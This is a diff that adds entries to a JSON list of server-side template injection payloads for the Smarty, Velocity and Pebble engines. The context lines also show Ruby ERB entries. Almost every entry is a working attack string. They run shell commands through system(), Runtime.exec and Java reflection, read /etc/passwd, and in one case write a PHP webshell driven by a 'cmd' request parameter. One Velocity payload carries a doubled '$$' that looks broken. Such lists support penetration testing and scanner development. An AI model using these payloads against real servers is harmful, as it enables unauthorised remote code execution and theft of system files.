@@ -57,6 +57,30 @@
         {"payload": "<%= require 'open3'; Open3.capture2('id')[0] %>", "description": "RCE via Open3.capture2", "waf_bypass": false},
         {"payload": "<%= File.read('/etc/passwd') %>", "description": "File read via ERB File.read", "waf_bypass": false}
       ]
+    },
+    "smarty": {
+      "description": "Server-Side Template Injection payloads for PHP Smarty template engine",
+      "payloads": [
+        {"payload": "{php}system('id'){/php}", "description": "RCE via Smarty 2 {php} tags", "waf_bypass": false},
+        {"payload": "{system('id')}", "description": "RCE via Smarty 3 with security policy disabled", "waf_bypass": false},
+        {"payload": "{$smarty.version}", "description": "Smarty version disclosure probe", "waf_bypass": false},
+        {"payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system($_GET['cmd']); ?>\",self::clearConfig())}", "description": "RCE via Smarty internal file write to webshell", "waf_bypass": false},
+        {"payload": "{if system('id')}{/if}", "description": "RCE via Smarty {if} tag with PHP function call", "waf_bypass": false}
+      ]
+    },
+    "velocity": {
+      "description": "Server-Side Template Injection payloads for Apache Velocity (Java)",
+      "payloads": [
+        {"payload": "#set($str=$class.inspect(\"java.lang.String\").type)", "description": "Velocity class inspection via ClassTool", "waf_bypass": false},
+        {"payload": "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")", "description": "RCE via Velocity ClassTool Runtime.exec", "waf_bypass": false},
+        {"payload": "#set($runtime=$$class.inspect(\"java.lang.Runtime\").type.getRuntime())$runtime.exec(\"id\")", "description": "RCE via Velocity variable-based Runtime.exec", "waf_bypass": false}
+      ]
+    },
+    "pebble": {
+      "description": "Server-Side Template Injection payloads for Pebble (Java/Spring)",
+      "payloads": [
+        {"payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}", "description": "RCE via Pebble reflection chain through Integer.TYPE to Runtime.exec", "waf_bypass": false}
+      ]
     }
   }
 }
